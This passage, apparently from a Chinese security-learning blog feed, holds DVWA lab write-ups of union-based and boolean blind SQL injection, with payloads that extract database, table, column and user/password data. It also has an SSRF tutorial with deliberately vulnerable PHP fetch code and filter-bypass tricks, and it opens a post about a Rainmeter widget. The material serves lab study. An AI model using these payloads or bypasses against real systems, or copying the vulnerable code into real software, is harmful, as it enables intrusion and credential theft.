class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到程序没有对输入的变量<code>$id</code>做任何安全处理，这也直接导致了sql注入的产生</p>
<h2 id="Medium-Level"><a href="#Medium-Level" class="headerlink" title="Medium Level"></a>Medium Level</h2><p>选择Medium等级，发现对输入做了明显的输入限制，从自由输入变为选择id<br>虽然我们在页面上无法进行输入，但是我们可以通过抓包更改数据的方式进行SQL注入</p>
<blockquote>
<p>配好代理，打开bp开始抓包，抓到数据包发现是数字型注入，方式和low等级方式基本相同<br>要注意的是转义了’等符号，在提交时会将’，”等符号转义为&#39;，&quot;<br>所以在payload中不要出现引号</p>
</blockquote>
<p>先order by查字段数</p>
<p><code>id=1 or 1=1</code><br><img src="https://sawrsg.bn.files.1drv.com/y4mykvYcaeaOz4H0GYQBi_mJAgeW4GGa5HcCOBe3WR_SXJf7kvwOpCYsuXZx-XXW8Y43aJr9ftJoLec_HFqrfFY5PSCeeG12YzU_tGvYwa0irJfmK9v7PMTHR5QUDLUJf7EoAtmC-Feg_vtAFLj7jpb3bfgttNfRoR8SOp7S3xcegNdGJCotChTcdrL2JiV-l8r9GzysOw7ZROlSiyxVGYsTg?width=1881&height=495&cropmode=none" alt><br><code>id=1 union select database(),2</code><br><img src="https://sawssg.by.files.1drv.com/y4m3DOyCV0C8ZhP6oCVztMEi9eSyENRi3iQbV_IJEGPOnQOvCrxgf9LVI_WHOUbqnbFeEjtCDqPl5eD7bRtHOyxk8sWBNJAS0AiZQusQmrs-G2TPfXXaB3PTeowLOMCM1-XyASAw9VS8VQhjZYIIBcVr6D6M7t4gnZJd5vabA2bpljjabFCnWfx3ikVDmvS3KaTDprf7NNCZg0sCeX5AFTBAA?width=1840&height=362&cropmode=none" alt><br><code>id=1 union select table_name,2 from information_schema.tables where table_schema=database()</code><br><img src="https://sawpsg.dm.files.1drv.com/y4mr8gy0yq15wG5MExK6ENulC387ulNcSdip3gSONsEDlRjXVfqn37IAQSNYQNPnoeed9a1kBWIvzLWxc-vSfF_bDPRXbXFbxv8PKDUKq67EsdzSolb9oZtiSNprKQkgbFrg6KZ43QQ-Szi5NZ6d10QEhX0Ngxi_8eG5DOHZ78lgk0GxkGXFWE6C4JQg9DegtN3xdHA_E3kv9Id-woyjqajwQ?width=1877&height=395&cropmode=none" alt><br>因为转移了引号，所以这里的表名用16进制进行绕过引号<code>id=1 union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x75736572</code><br><img src="https://sawqsg.dm.files.1drv.com/y4mLBu0viVRqa0Aum6vc5gV_-mIpuqFetYkSTvf4T-mgDs4PPFLaGa-WY7UT60dZAkEYGDVMPrOuxrFd6oMt3upu1LFhRWgApF5rrJWqaTHTplG67nVum-XSmveLAn8tmmyZtCqwUQ14Mm5SQOzUz3DT6TMzu8SpMilOlwlzmKgzX0i1vCfOYETuFMb3-4Evo5FXwTY5hKpw29kMQnyxSaXLw?width=1896&height=348&cropmode=none" alt><br><code>id=1 union select user,password from users</code><br><img src="https://sawnsg.bn.files.1drv.com/y4mlRwgdtfBgh36KjGfIPP734mlOLSWIZpQjWN8ezwEJtpgd3SOAJP7E5x9khXLo1Hce2BHXI5_69Pfd5Mz46aXb2aR1JX3L6H6bmE7sEeYHTRoAsjuriMvTG3qAPZiQjgz-kzmiJpXlLN1zaxYnt7FPqrtjgJfRYzAwavrq3VqE0tQWi762sh4w1HYBc1pwomYAEDdcKx8UIYvmV8d_ePgJA?width=1884&height=303&cropmode=none" alt></p>
<h2 id="High-Leavel"><a href="#High-Leavel" class="headerlink" title="High Leavel"></a>High Leavel</h2><p>分析 high 等级的源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Get input</span></span></span><br><span class="line"><span class="php">    $id = $_SESSION[ <span class="string">'id'</span> ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Check database</span></span></span><br><span class="line"><span class="php">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span></span><br><span class="line"><span class="php">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Get results</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Get values</span></span></span><br><span class="line"><span class="php">        $first = $row[<span class="string">"first_name"</span>];</span></span><br><span class="line"><span class="php">        $last  = $row[<span class="string">"last_name"</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="comment">// Feedback for end user</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>high等级的查询是通过在弹出页面输入id然后提交进行查询，将数据展示在原页面上，<br>而且id的值储存在了SESSION中，程序也没有对id进行任何的安全处理，这样产生了sql注入问题<br>high等级的这种做法能够避免sqlmap进行爆破，但是如果不对数据进行安全处理，还是会引发安全问题</p>
<p>high等级的注入payload和low等级的基本相同</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">' order by <span class="number">1</span><span class="meta">#		正常</span></span><br><span class="line">' order by <span class="number">2</span><span class="meta">#		正常</span></span><br><span class="line">' order by <span class="number">3</span><span class="meta">#		返回错误字段数为2</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>()<span class="meta">#		查数据库名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="built_in">database</span>()<span class="meta">#		查表名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,column_name from information_schema.columns <span class="built_in">where</span> table_name='users'<span class="meta">#		查列名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> user,password from dvwa.users<span class="meta">#		查字段</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><ul>
<li>对于基于布尔的盲注，可通过构造真or假判断条件(数据库各项信息取值的大小比较，如:字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…)，将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果(True、False)；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</li>
<li>对于基于时间的盲注，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假(若执行sleep延迟，则表示当前设置的判断条件为真)；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</li>
<li>报错型注入则是利用了MySQL的第8652号bug :Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果。</li>
</ul>
<p><strong>以下使用的方法均为基于布尔的盲注</strong><br>基于时间的盲注参考<a href="http://www.storysec.com/dvwa-sql-injection-blind.html" target="_blank" rel="noopener">传送门</a></p>
<h2 id="Low-Level-1"><a href="#Low-Level-1" class="headerlink" title="Low Level"></a>Low Level</h2><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1’</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1 and 1=1#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1’ and 1=1#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1 and 1=2#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1’ and 1=2#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
</tbody></table>
<p>说明存在<strong>字符型</strong>的sql<strong>盲注</strong></p>
<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><ol>
<li>猜解数据库名的长度</li>
</ol>
<table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1’ and length(database())&lt;10#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1’ and length(database())&lt;5#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">1’ and length(database())&lt;3#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and length(database())=4#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">说明数据库名长度为4</td>
<td align="center"></td>
</tr>
</tbody></table>
<ol start="2">
<li>猜解数据库名<br>利用substr()函数和ascii()函数进行猜解数据库名<br><code>substr(string, start, length)</code></li>
</ol>
<table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1’ and ascii(substr(database(),1,1))&gt;97#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and ascii(substr(database(),1,1))&lt;122#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and ascii(substr(database(),1,1))&lt;109#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and ascii(substr(database(),1,1))&lt;103#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and ascii(substr(database(),1,1))&lt;100#</td>
<td align="center">User ID is MISSING from the database.</td>
</tr>
<tr>
<td align="center">1’ and ascii(substr(database(),1,1))=100#</td>
<td align="center">User ID exists in the database.</td>
</tr>
<tr>
<td align="center">猜解出数据库名的第一个字符为ascii码为100的字符 d</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">循环上述操作，最终猜解出数据库名dvwa</td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><ol>
<li>猜解表的数量<br>最终返回exist的payload <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2#</code><br>猜解出有两个表</li>
<li>猜解表名长度<br>猜解出第一个表名的长度payload <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1),1))=9#</code><br>猜解出第二个表名的长度payload <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),1))=5#</code></li>
<li>猜解表名<br>猜解第一个表名<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</code><br>……<br>循环猜解得到第一个表名为guestbook<br>猜解第二个表名<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;97#</code><br>……<br>循环猜解得到第二个表名为users</li>
</ol>
<h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><ol>
<li>猜解列数量<br>payload <code>1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=11#</code></li>
<li>猜解列长度<br>payload <code>1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=7#</code><br>……<br>循环猜解出每个列名的长度</li>
<li>猜解列名<br>payload <code>1&#39; and ascii(strsub((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),1,1))&gt;1#</code><br>得到列名 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3>payload <code>1&#39; and ascii(substr((select user from dvwa.users where user_id=1),1,1))&gt;1#</code><br>循环查询user和password的值</li>
</ol>
<h2 id="Medium-Level-1"><a href="#Medium-Level-1" class="headerlink" title="Medium Level"></a>Medium Level</h2><p>总体思路和Low没什么区别<br>思路:bp抓包提交payload，循环爆破数据库名，表名，列名，字段值<br>注意点:<strong>数字型</strong>的<strong>盲注</strong>，需要16进制绕过对引号的转义</p>
<h2 id="High-Level"><a href="#High-Level" class="headerlink" title="High Level"></a>High Level</h2><p>思路和Low也没什么区别<br>思路:构造payload，循环爆破数据库名，表名，列名，字段值<br>注意点:<strong>字符型</strong>的<strong>盲注</strong>，可能需要用#注释掉 LIMIT 语句的限制，程序中添加了随机的sleep()函数，会使得基于时间的盲注受到干扰</p>
<blockquote>
<p><strong>相关链接:</strong><br><a href="https://www.abelche.com/2018/07/02/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" target="_blank" rel="noopener">关于SQL基本增删改查</a><br><a href="https://www.abelche.com/2018/07/25/%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">关于SQL注入的常见方式</a><br><a href="https://www.abelche.com/2018/08/07/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/" target="_blank" rel="noopener">SQL手注</a><br><a href="http://www.storysec.com/dvwa-sql-injection-blind.html" target="_blank" rel="noopener">dvwa基于时间的盲注</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf漏洞解析</title>
    <url>/2019/03/17/ssrf%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>攻击者可以利用 SSRF 实现的攻击主要有 5 种:</p>
<ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
<li>攻击运行在内网或本地的应用程序(比如溢出)</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(比如 Struts2，sqli 等)</li>
<li>利用 file 协议读取本地文件等</li>
</ol>
<p>上面的话说的有点抽象，然后说一下网上大佬的理解<br><strong>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 : A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</strong><br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。<br>正常用户访问网站的流程是:<br>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求(没有过滤)，并处理 –&gt;返回用户响应<br>【 那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL</a> 】<br>那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性<br>产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据<br>例如:<br><a href="http://www.baidu.com/xxx.php?image=www.abc.com/1.jpg" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=www.abc.com/1.jpg</a><br>如果我们将<a href="http://www.abd.com/1.jpg" target="_blank" rel="noopener">www.abd.com/1.jpg</a> 换为与该服务器相连的内网服务器地址会产生什么效果呢？<br>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码<br>终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>
<h1 id="可能出现的场景"><a href="#可能出现的场景" class="headerlink" title="可能出现的场景"></a>可能出现的场景</h1><ul>
<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
<li>从远程服务器请求资源(Upload from URL，Import &amp; Export RSS Feed)</li>
<li>数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB)</li>
<li>Webmail 收取其他邮箱邮件(POP3、IMAP、SMTP)</li>
<li>文件处理、编码处理、属性信息处理(ffmpeg、ImageMagic、DOCX、PDF、XML)</li>
</ul>
<h1 id="可进行利用的协议"><a href="#可进行利用的协议" class="headerlink" title="可进行利用的协议"></a>可进行利用的协议</h1><pre><code>FILE                           读取服务器上任意文件内容
IMAP/IMAPS/POP3SMTP/SMTPS      爆破邮件用户名密码
FTP/FTPS                       FTP匿名访问、爆破
DICT                           操作内网Redis等服务
GOPHER                         能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞
TFTP                           UDP协议扩展</code></pre><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span></span><br><span class="line"><span class="php">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span></span><br><span class="line"><span class="php">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span></span><br><span class="line"><span class="php">    file_put_contents($filename, $content); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span></span><br><span class="line"><span class="php">    $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $img;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><p>打开网络连接或者Unix套接字连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">'url'</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="string">"<span class="variable">$host</span>"</span>, 80, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">"Host: <span class="variable">$host</span>\r\n"</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> fgets(<span class="variable">$fp</span>, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><p>使用 curl 获取到数据<br>使用 file:// 获取到数据</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $link = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $curlobj = curl_init();</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj,CURLOPT_URL,$link);</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    $result=curl_exec($curlobj);</span></span><br><span class="line"><span class="php">    curl_close($curlobj);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $filename = <span class="string">'./'</span>.rand().<span class="string">'.txt'</span>;</span></span><br><span class="line"><span class="php">    file_put_contents($filename, $result); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $result;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h1 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h1><p>利用 file 协议读取文件<br>利用 dict 协议查看端口<br>利用 gopher 协议反弹shell，攻击数据库</p>
<h1 id="常见的过滤方法"><a href="#常见的过滤方法" class="headerlink" title="常见的过滤方法"></a>常见的过滤方法</h1><ul>
<li>对 url 开头进行过滤</li>
<li>对 url 为 ip 格式的连接进行过滤</li>
<li>对 url 结尾进行判定</li>
</ul>
<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><ul>
<li><p>更改 IP 地址写法 例如192.168.0.1</p>
<p>8 进制格式:0300.0250.0.1</p>
<p>16 进制格式:0xC0.0xA8.0.1</p>
<p>10 进制整数格式:3232235521</p>
<p>16 进制整数格式:0xC0A80001</p>
<p>还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1</p>
<p>利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如:</p>
</li>
<li><p><a href="http://www.baidu.com@192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a> 与 <a href="http://192.168.0.1" target="_blank" rel="noopener">http://192.168.0.1</a> 请求的都是 192.168.0.1 的内容</p>
</li>
<li><p>可以指向任意 ip 的域名xip.io:<a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a> ==&gt; <a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a></p>
</li>
<li><p>短地址<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a> ==&gt; <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></p>
</li>
<li><p>利用句号。:127。0。0。1 ==&gt; 127.0.0.1</p>
</li>
<li><p>利用 Enclosed alphanumerics</p>
<pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre></li>
</ul>
<hr>
<p>参考文章:<br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf/</a><br><a href="https://www.jianshu.com/p/6bf7700139fa" target="_blank" rel="noopener">https://www.jianshu.com/p/6bf7700139fa</a><br><a href="https://www.jianshu.com/p/d1d1c40f6d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/d1d1c40f6d4c</a><br><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">https://www.jianshu.com/p/86bb349baac1</a></p>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ssrf</tag>
        <tag>服务端请求伪造</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Rainmeter的B站每日top100桌面推送!!!</title>
    <url>/2019/03/01/%E5%9F%BA%E4%BA%8ERainmeter%E7%9A%84B%E7%AB%99%E6%AF%8F%E6%97%A5top100%E6%A1%8C%E9%9D%A2%E6%8E%A8%E9%80%81/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>最近在使用Rainmeter，将quotes(桌面箴言)改进了一下，他就有了如下功能！</p>
<blockquote>
<ul>
<li>获取B站每日top100视频信息</li>
<li>将信息随机展示在桌面quote上(随机展示一条信息，标题限制在20字，自动/手动切换)</li>
<li>双击quote可在浏览器中打开该视频<br>长相如下:<img src="https://8gdtaw.sn.files.1drv.com/y4mTP9F1e7APG2GWA4OiKh1TVORDSbjEo8_ooAMpGYH685lAnbYy0NIYVSppiqVfpjlJEqjczGGPX7BVehEkbuCnk6zAP58qPDiXJEx5BcqpZ6_mx_HBwkaucKg3cMnKc2KC7TO3hSCWalDVLe1k9i-1BCdCJWkE3xMNS8SKrTMd4sdDhF0x3iwDkVwiFsUO1xsfoqNcs4Wrkjy0j2xc84eoA?width=488&height=117&cropmode=none" alt><br>然后，这是我的桌面(有些东西不太好，就隐藏了)<img src="https://8gdqaw.sn.files.1drv.com/y4mTNvE_llBhfDtxHy0rBCwkn4arhOUPCgHIKqdt6V6zNl_qP9M1niQrN8iKr13BP1GpHCyLjXyTXKj_Ust1hMmZ9qfQanPFWiHiEx9OLNu8gdUQWiaVOX_GpvHEtX9NKGJLdpNSjcSbASGbsncU32Gnxb2VgTwavmFU6nY82AM44DNtQL2p5QtwPpKswH0eXIR8ZEBnl_jkAt37taFRwRjGQ?width=1920&height=1080&cropmode=none" alt></li>
</ul>
</blockquote>
<h1 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h1><p>先看下quotes目录下的东西:<img src="https://8gdraw.sn.files.1drv.com/y4ma1cFO61keBtCvpCKrPTR7GOiPOykXDdOy8GuEtBk4eJXxvhG1YJxqYCrdVard4hHt12j5iE2f9mM4THCePyCm3z9kuJ8w7hrjquALQmvg4fV8XQYYAijtc27UAkKpfPhhLSRU3od7Wx7lrIrIBKw3ilyD_JRA-0OzuFIEysuvev6pH1WxDETQGEbl4U-WFlu7v8wFPcXV-xE6vXmD3Ovhg?width=189&height=154&cropmode=none" alt></p>
<ul>
